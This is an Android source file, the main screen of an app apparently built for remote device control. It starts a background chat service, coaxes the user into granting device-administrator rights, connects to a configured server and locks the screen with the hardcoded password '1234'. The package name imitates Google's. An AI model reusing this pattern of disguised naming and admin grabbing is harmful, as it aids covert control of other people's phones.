package com.google.undercontrol;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.text.TextUtils;
import android.view.View;

import com.google.undercontrol.service.AnyChatService;
import com.google.undercontrol.service.BDLocationService;
import com.google.undercontrol.utils.MyConstant;
import com.google.undercontrol.utils.Utils;

public class MainActivity extends Activity {
	private SharedPreferences sp;
	private Intent intent;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		sp = getSharedPreferences("config", MODE_PRIVATE);
		String serverIP = sp.getString("serverIP", null);

		intent = new Intent(this, AnyChatService.class);
		startService(intent);
		
		openAdmin();
		

		if (TextUtils.isEmpty(serverIP)) {
			intent = new Intent(this, ServerConfigActivity.class);
			startActivity(intent);
			finish();
			return;
		}

	}
	
	
	/**
	 * 打开Admin权限
	 */
	public  void openAdmin(){
		//声明一个意图，作用是开启设备的超级管理员
		  Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
		  ComponentName cn = new ComponentName(this, MyAdmin.class);
          intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
          //劝说用户开启管理员
          intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                  "开启我把。开启我就可以锁屏了.");
          startActivity(intent);
	}

	/**
	 * 设置服务器参数
	 * 
	 * @param v
	 */
	public void setServerConfig(View v) {
		Intent intent = new Intent(this, ServerConfigActivity.class);
		startActivity(intent);
	}

	public void connServer(View v) {
		Intent intent=new Intent();
		intent.setAction(MyConstant.ANYCHAT_SERVICE_RECEIVE_ACTION);
		intent.putExtra("command", MyConstant.RECONN_SERVER);
		sendBroadcast(intent);
	}

	public void closeConn(View v) {
		Intent intent=new Intent();
		intent.setAction(MyConstant.ANYCHAT_SERVICE_RECEIVE_ACTION);
		intent.putExtra("command", MyConstant.BREAK_SERVER);
		sendBroadcast(intent);
	}
	
	public void sendMsg(View v){
		Utils.lockScreen(getApplicationContext(), "1234");
	}
}
